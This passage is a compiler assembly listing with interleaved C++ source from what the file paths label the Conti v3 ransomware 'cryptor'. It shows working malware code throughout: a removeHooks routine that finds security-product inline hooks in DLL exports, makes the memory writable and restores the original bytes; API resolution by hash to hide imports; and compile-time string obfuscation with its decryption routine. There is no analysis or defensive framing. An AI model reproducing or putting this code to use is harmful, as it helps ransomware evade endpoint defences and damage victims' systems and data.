  00292	e8 00 00 00 00	 call	 ?Rva2Offset@@YAKK_K@Z	; Rva2Offset

; 333  :         + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNameOrdinals,
; 334  :             uiBaseAddress);
; 335  : 
; 336  :     // get a counter for the number of exported functions...
; 337  :     dwCounter = ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->NumberOfNames;

  00297	45 8b 65 18	 mov	 r12d, DWORD PTR [r13+24]
  0029b	44 8b f8	 mov	 r15d, eax
  0029e	4c 03 fe	 add	 r15, rsi

; 338  : 
; 339  :     //    
; 340  :     for (; dwCounter--; uiNameArray += sizeof(DWORD), uiNameOrdinals += sizeof(WORD))

  002a1	45 85 e4	 test	 r12d, r12d
  002a4	0f 84 ab 01 00
	00		 je	 $LN173@removeHook
  002aa	66 0f 1f 44 00
	00		 npad	 6
$LL4@removeHook:

; 341  :     {
; 342  : 
; 343  :         char* cpExportedFunctionName = (char*)(uiBaseAddress

  002b0	41 8b 0e	 mov	 ecx, DWORD PTR [r14]
  002b3	48 8b d6	 mov	 rdx, rsi
  002b6	41 ff cc	 dec	 r12d
  002b9	e8 00 00 00 00	 call	 ?Rva2Offset@@YAKK_K@Z	; Rva2Offset

; 344  :             + Rva2Offset(DEREF_32(uiNameArray), uiBaseAddress));
; 345  : 
; 346  :         uiAddressArray = uiBaseAddress

  002be	41 8b 4d 1c	 mov	 ecx, DWORD PTR [r13+28]
  002c2	48 8b d6	 mov	 rdx, rsi
  002c5	8b f8		 mov	 edi, eax
  002c7	48 03 fe	 add	 rdi, rsi
  002ca	e8 00 00 00 00	 call	 ?Rva2Offset@@YAKK_K@Z	; Rva2Offset

; 347  :             + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions,
; 348  :                 uiBaseAddress);
; 349  : 
; 350  :         // use the functions name ordinal as an index into the array of name pointers
; 351  :         uiAddressArray += (DEREF_16(uiNameOrdinals) * sizeof(DWORD));

  002cf	41 0f b7 0f	 movzx	 ecx, WORD PTR [r15]

; 352  : 
; 353  :         // compute the File Offset to the function code
; 354  :         UINT_PTR funcAddr = uiBaseAddress + Rva2Offset(DEREF_32(uiAddressArray),

  002d3	48 8b d6	 mov	 rdx, rsi
  002d6	8b c0		 mov	 eax, eax
  002d8	48 03 c6	 add	 rax, rsi
  002db	8b 0c 88	 mov	 ecx, DWORD PTR [rax+rcx*4]
  002de	e8 00 00 00 00	 call	 ?Rva2Offset@@YAKK_K@Z	; Rva2Offset
  002e3	8b d8		 mov	 ebx, eax
  002e5	48 03 de	 add	 rbx, rsi

; 170  :     for (int i = 0; func[i] && i < max_check; ++i) {

  002e8	80 3b 00	 cmp	 BYTE PTR [rbx], 0
  002eb	0f 84 53 01 00
	00		 je	 $LN2@removeHook

; 338  : 
; 339  :     //    
; 340  :     for (; dwCounter--; uiNameArray += sizeof(DWORD), uiNameOrdinals += sizeof(WORD))

  002f1	4c 8b c3	 mov	 r8, rbx
  002f4	48 8b d3	 mov	 rdx, rbx
  002f7	49 f7 d8	 neg	 r8
  002fa	66 0f 1f 44 00
	00		 npad	 6
$LL77@removeHook:

; 170  :     for (int i = 0; func[i] && i < max_check; ++i) {

  00300	49 8d 04 10	 lea	 rax, QWORD PTR [r8+rdx]
  00304	48 3d 80 00 00
	00		 cmp	 rax, 128		; 00000080H
  0030a	0f 8d 34 01 00
	00		 jge	 $LN2@removeHook

; 171  : 
; 172  :         if (!(ah_isalfanum(func[i]) || func[i] == '.' || func[i] == '_' || func[i] == '-')) {

  00310	0f b6 02	 movzx	 eax, BYTE PTR [rdx]

; 160  :     bool res = (C >= 'a' && C <= 'z') || (C >= 'A' && C <= 'Z') || (C >= '0' && C <= '9');

  00313	3c 61		 cmp	 al, 97			; 00000061H
  00315	7c 6f		 jl	 SHORT $LN82@removeHook
  00317	3c 7a		 cmp	 al, 122			; 0000007aH
  00319	0f 8e 89 00 00
	00		 jle	 $LN75@removeHook
$LN143@removeHook:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 1278 : 	pFunction = (FARPROC(WINAPI*)(HMODULE, LPCSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xb6a6d4a2, 3);

  0031f	ba 0f 00 00 00	 mov	 edx, 15
  00324	41 b8 a2 d4 a6
	b6		 mov	 r8d, -1230580574	; b6a6d4a2H
  0032a	44 8d 4a f4	 lea	 r9d, QWORD PTR [rdx-12]
  0032e	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 1279 : 	return pFunction(hModule, lpProcName);

  00333	48 8b 4c 24 58	 mov	 rcx, QWORD PTR hmodule$GSCopy$1$[rsp]
  00338	48 8b d7	 mov	 rdx, rdi
  0033b	ff d0		 call	 rax
  0033d	48 8b f8	 mov	 rdi, rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\antihooks\antihooks.cpp

; 364  :         if (!funcHooked) continue;

  00340	48 85 c0	 test	 rax, rax
  00343	0f 84 fb 00 00
	00		 je	 $LN2@removeHook

; 365  : 
; 366  :         BYTE* p = (BYTE*)funcHooked;
; 367  :         if (p[0] != 0xe9) {

  00349	0f b6 00	 movzx	 eax, BYTE PTR [rax]
  0034c	3c e9		 cmp	 al, 233			; 000000e9H
  0034e	74 12		 je	 SHORT $LN17@removeHook

; 368  :             if (p[0] != 0xff) continue;

  00350	3c ff		 cmp	 al, 255			; 000000ffH
  00352	0f 85 ec 00 00
	00		 jne	 $LN2@removeHook

; 369  :             if (p[1] != 0x25) continue;

  00358	80 7f 01 25	 cmp	 BYTE PTR [rdi+1], 37	; 00000025H
  0035c	0f 85 e2 00 00
	00		 jne	 $LN2@removeHook
$LN17@removeHook:

; 82   :     if (!buf1 || !buf2)

  00362	48 85 db	 test	 rbx, rbx
  00365	74 65		 je	 SHORT $LN137@removeHook

; 83   :     {
; 84   :         return -1;
; 85   :     }
; 86   : 
; 87   :     unsigned char* p1 = (unsigned char*)buf1;
; 88   :     unsigned char* p2 = (unsigned char*)buf2;
; 89   : 
; 90   :     int   rc = 0;

  00367	45 33 c0	 xor	 r8d, r8d
  0036a	33 c0		 xor	 eax, eax
  0036c	0f 1f 40 00	 npad	 4
$LL100@removeHook:

; 91   : 
; 92   :     for (size_t i = 0; i < count; i++)
; 93   :     {
; 94   :         if (*p1 < *p2)

  00370	0f b6 0c 18	 movzx	 ecx, BYTE PTR [rax+rbx]
  00374	3a 0c 38	 cmp	 cl, BYTE PTR [rax+rdi]
  00377	72 48		 jb	 SHORT $LN119@removeHook

; 97   :             break;
; 98   :         }
; 99   : 
; 100  :         if (*p1 > * p2)

  00379	77 3e		 ja	 SHORT $LN120@removeHook

; 103  :             break;
; 104  :         }
; 105  : 
; 106  :         p1++;
; 107  :         p2++;

  0037b	48 ff c0	 inc	 rax
  0037e	48 83 f8 02	 cmp	 rax, 2
  00382	72 ec		 jb	 SHORT $LL100@removeHook

; 394  :         if (!apVirtualProtect(funcHooked, 64, oldProtect, &oldProtect1))

  00384	eb 41		 jmp	 SHORT $LN99@removeHook
$LN82@removeHook:

; 160  :     bool res = (C >= 'a' && C <= 'z') || (C >= 'A' && C <= 'Z') || (C >= '0' && C <= '9');

  00386	8d 48 bf	 lea	 ecx, DWORD PTR [rax-65]
  00389	80 f9 19	 cmp	 cl, 25
  0038c	76 1a		 jbe	 SHORT $LN75@removeHook
  0038e	3c 30		 cmp	 al, 48			; 00000030H
  00390	7c 06		 jl	 SHORT $LN138@removeHook
  00392	3c 39		 cmp	 al, 57			; 00000039H
  00394	7f 06		 jg	 SHORT $LN141@removeHook
  00396	eb 10		 jmp	 SHORT $LN75@removeHook
$LN138@removeHook:

; 172  :         if (!(ah_isalfanum(func[i]) || func[i] == '.' || func[i] == '_' || func[i] == '-')) {

  00398	3c 2e		 cmp	 al, 46			; 0000002eH
  0039a	74 0c		 je	 SHORT $LN75@removeHook
$LN141@removeHook:
  0039c	3c 5f		 cmp	 al, 95			; 0000005fH
  0039e	74 08		 je	 SHORT $LN75@removeHook
  003a0	3c 2d		 cmp	 al, 45			; 0000002dH
  003a2	0f 85 77 ff ff
	ff		 jne	 $LN143@removeHook
$LN75@removeHook:

; 161  :     return res;
; 162  : }
; 163  : 
; 164  : bool isForwardedFunc(const void* funcAddr)
; 165  : {
; 166  :     char* func = (char*)funcAddr;
; 167  :     const int max_check = 128;
; 168  :     bool forwarder = true;
; 169  : 
; 170  :     for (int i = 0; func[i] && i < max_check; ++i) {

  003a8	48 ff c2	 inc	 rdx
  003ab	80 3a 00	 cmp	 BYTE PTR [rdx], 0
  003ae	0f 85 4c ff ff
	ff		 jne	 $LL77@removeHook
  003b4	e9 8b 00 00 00	 jmp	 $LN2@removeHook
$LN120@removeHook:

; 102  :             rc = 1;

  003b9	41 b8 01 00 00
	00		 mov	 r8d, 1
  003bf	eb 06		 jmp	 SHORT $LN99@removeHook
$LN119@removeHook:

; 95   :         {
; 96   :             rc = -1;

  003c1	41 b8 ff ff ff
	ff		 mov	 r8d, -1
$LN99@removeHook:

; 370  :         }
; 371  : 
; 372  : #ifdef __MINGW32__
; 373  :         bool funcIsHooked = (memcmp((const void*)funcAddr, (const void*)funcHooked, 2) != 0);
; 374  : #else
; 375  :         bool funcIsHooked = m_memcmp((const void*)funcAddr, (const void*)funcHooked, 2) != 0;

  003c7	45 85 c0	 test	 r8d, r8d

; 376  : #endif // __MINGW32
; 377  :         if (!funcIsHooked) continue;

  003ca	74 78		 je	 SHORT $LN2@removeHook
$LN137@removeHook:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 1253 : 	pFunction = (BOOL(WINAPI*)(LPVOID, SIZE_T, DWORD, PDWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x00a7e8a5, 5);

  003cc	ba 0f 00 00 00	 mov	 edx, 15
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\antihooks\antihooks.cpp

; 379  :         DWORD oldProtect = 0;

  003d1	c7 44 24 60 00
	00 00 00	 mov	 DWORD PTR oldProtect$3[rsp], 0
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 1253 : 	pFunction = (BOOL(WINAPI*)(LPVOID, SIZE_T, DWORD, PDWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x00a7e8a5, 5);

  003d9	41 b8 a5 e8 a7
	00		 mov	 r8d, 11004069		; 00a7e8a5H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\antihooks\antihooks.cpp

; 380  :         DWORD oldProtect1 = 0;

  003df	c7 44 24 64 00
	00 00 00	 mov	 DWORD PTR oldProtect1$4[rsp], 0
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 1253 : 	pFunction = (BOOL(WINAPI*)(LPVOID, SIZE_T, DWORD, PDWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x00a7e8a5, 5);

  003e7	44 8d 4a f6	 lea	 r9d, QWORD PTR [rdx-10]
  003eb	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 1254 : 	return pFunction(lpAddress, dwSize, flNewProtect, lpflOldProtect);

  003f0	ba 40 00 00 00	 mov	 edx, 64			; 00000040H
  003f5	4c 8d 4c 24 60	 lea	 r9, QWORD PTR oldProtect$3[rsp]
  003fa	44 8b c2	 mov	 r8d, edx
  003fd	48 8b cf	 mov	 rcx, rdi
  00400	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\antihooks\antihooks.cpp

; 388  :         if (!apVirtualProtect(funcHooked, 64, PAGE_EXECUTE_READWRITE, &oldProtect))

  00402	85 c0		 test	 eax, eax
  00404	74 4f		 je	 SHORT $LN173@removeHook

; 392  :         CopyMemory((void*)funcHooked, (void*)funcAddr, 10);

  00406	f2 0f 10 03	 movsd	 xmm0, QWORD PTR [rbx]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 1253 : 	pFunction = (BOOL(WINAPI*)(LPVOID, SIZE_T, DWORD, PDWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x00a7e8a5, 5);

  0040a	ba 0f 00 00 00	 mov	 edx, 15
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\antihooks\antihooks.cpp

; 392  :         CopyMemory((void*)funcHooked, (void*)funcAddr, 10);

  0040f	f2 0f 11 07	 movsd	 QWORD PTR [rdi], xmm0
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 1253 : 	pFunction = (BOOL(WINAPI*)(LPVOID, SIZE_T, DWORD, PDWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x00a7e8a5, 5);

  00413	41 b8 a5 e8 a7
	00		 mov	 r8d, 11004069		; 00a7e8a5H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\antihooks\antihooks.cpp

; 392  :         CopyMemory((void*)funcHooked, (void*)funcAddr, 10);

  00419	0f b7 43 08	 movzx	 eax, WORD PTR [rbx+8]
  0041d	66 89 47 08	 mov	 WORD PTR [rdi+8], ax

; 394  :         if (!apVirtualProtect(funcHooked, 64, oldProtect, &oldProtect1))

  00421	8b 5c 24 60	 mov	 ebx, DWORD PTR oldProtect$3[rsp]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 1253 : 	pFunction = (BOOL(WINAPI*)(LPVOID, SIZE_T, DWORD, PDWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x00a7e8a5, 5);

  00425	44 8d 4a f6	 lea	 r9d, QWORD PTR [rdx-10]
  00429	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 1254 : 	return pFunction(lpAddress, dwSize, flNewProtect, lpflOldProtect);

  0042e	4c 8d 4c 24 64	 lea	 r9, QWORD PTR oldProtect1$4[rsp]
  00433	44 8b c3	 mov	 r8d, ebx
  00436	ba 40 00 00 00	 mov	 edx, 64			; 00000040H
  0043b	48 8b cf	 mov	 rcx, rdi
  0043e	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\antihooks\antihooks.cpp

; 394  :         if (!apVirtualProtect(funcHooked, 64, oldProtect, &oldProtect1))

  00440	85 c0		 test	 eax, eax
  00442	74 11		 je	 SHORT $LN173@removeHook
$LN2@removeHook:

; 338  : 
; 339  :     //    
; 340  :     for (; dwCounter--; uiNameArray += sizeof(DWORD), uiNameOrdinals += sizeof(WORD))

  00444	49 83 c6 04	 add	 r14, 4
  00448	49 83 c7 02	 add	 r15, 2
  0044c	45 85 e4	 test	 r12d, r12d
  0044f	0f 85 5b fe ff
	ff		 jne	 $LL4@removeHook
$LN173@removeHook:
  00455	4c 8b b4 24 98
	02 00 00	 mov	 r14, QWORD PTR [rsp+664]
  0045d	4c 8b ac 24 d8
	02 00 00	 mov	 r13, QWORD PTR [rsp+728]
  00465	4c 8b a4 24 d0
	02 00 00	 mov	 r12, QWORD PTR [rsp+720]
  0046d	4c 8b bc 24 90
	02 00 00	 mov	 r15, QWORD PTR [rsp+656]
$LN169@removeHook:
  00475	48 8b b4 24 c8
	02 00 00	 mov	 rsi, QWORD PTR [rsp+712]
$LN126@removeHook:

; 397  : }

  0047d	48 8b 8d 80 01
	00 00		 mov	 rcx, QWORD PTR __$ArrayPad$[rbp-256]
  00484	48 33 cc	 xor	 rcx, rsp
  00487	e8 00 00 00 00	 call	 __security_check_cookie
  0048c	48 81 c4 a0 02
	00 00		 add	 rsp, 672		; 000002a0H
  00493	5f		 pop	 rdi
  00494	5b		 pop	 rbx
  00495	5d		 pop	 rbp
  00496	c3		 ret	 0
$LN11@removeHook:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 228  : 	pFunction = (BOOL(WINAPI*)(HANDLE))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xca528872, 91);//GetProcAddress(hKernel32, OBFA("CloseHandle"));

  00497	ba 0f 00 00 00	 mov	 edx, 15
  0049c	41 b8 72 88 52
	ca		 mov	 r8d, -900560782		; ca528872H
  004a2	44 8d 4a 4c	 lea	 r9d, QWORD PTR [rdx+76]
  004a6	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 229  : 	return pFunction(hObject);

  004ab	48 8b cf	 mov	 rcx, rdi
  004ae	ff d0		 call	 rax

; 228  : 	pFunction = (BOOL(WINAPI*)(HANDLE))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xca528872, 91);//GetProcAddress(hKernel32, OBFA("CloseHandle"));

  004b0	ba 0f 00 00 00	 mov	 edx, 15
$LN174@removeHook:
  004b5	41 b9 5b 00 00
	00		 mov	 r9d, 91			; 0000005bH
  004bb	41 b8 72 88 52
	ca		 mov	 r8d, -900560782		; ca528872H
  004c1	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 229  : 	return pFunction(hObject);

  004c6	48 8b cb	 mov	 rcx, rbx
  004c9	ff d0		 call	 rax
  004cb	eb a8		 jmp	 SHORT $LN169@removeHook
?removeHooks@@YAXPEAUHINSTANCE__@@@Z ENDP		; removeHooks
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GL@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0GL@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<107,2,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0d 00 00
	00		 mov	 r11d, 13
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 02	 sub	 ecx, 2

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 13	 imul	 r8d, ecx, 19

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GL@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<107,2,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0GL@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0GL@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<107,2,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::MetaBuffer<107,2,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 15	 mov	 BYTE PTR [rcx+1], 21
  00007	c6 41 02 0e	 mov	 BYTE PTR [rcx+2], 14
  0000b	c6 41 03 08	 mov	 BYTE PTR [rcx+3], 8
  0000f	c6 41 04 58	 mov	 BYTE PTR [rcx+4], 88	; 00000058H
  00013	c6 41 05 0e	 mov	 BYTE PTR [rcx+5], 14
  00017	c6 41 06 01	 mov	 BYTE PTR [rcx+6], 1
  0001b	c6 41 07 7d	 mov	 BYTE PTR [rcx+7], 125	; 0000007dH
  0001f	c6 41 08 12	 mov	 BYTE PTR [rcx+8], 18
  00023	c6 41 09 62	 mov	 BYTE PTR [rcx+9], 98	; 00000062H
  00027	c6 41 0a 22	 mov	 BYTE PTR [rcx+10], 34	; 00000022H
  0002b	c6 41 0b 01	 mov	 BYTE PTR [rcx+11], 1
  0002f	c6 41 0c 01	 mov	 BYTE PTR [rcx+12], 1
  00033	c6 41 0d 02	 mov	 BYTE PTR [rcx+13], 2
  00037	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0003b	48 8b c1	 mov	 rax, rcx
  0003e	c3		 ret	 0
??0?$MetaBuffer@$0GL@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<107,2,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::MetaBuffer<107,2,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$04$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$04$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<5,77,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0c 00 00
	00		 mov	 r11d, 12
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 4d	 sub	 ecx, 77			; 0000004dH

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 33	 imul	 r8d, ecx, 51		; 00000033H

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$04$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<5,77,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$04$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$04$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<5,77,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<5,77,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 6f	 mov	 BYTE PTR [rcx+1], 111	; 0000006fH
  00007	c6 41 02 59	 mov	 BYTE PTR [rcx+2], 89	; 00000059H
  0000b	c6 41 03 4a	 mov	 BYTE PTR [rcx+3], 74	; 0000004aH
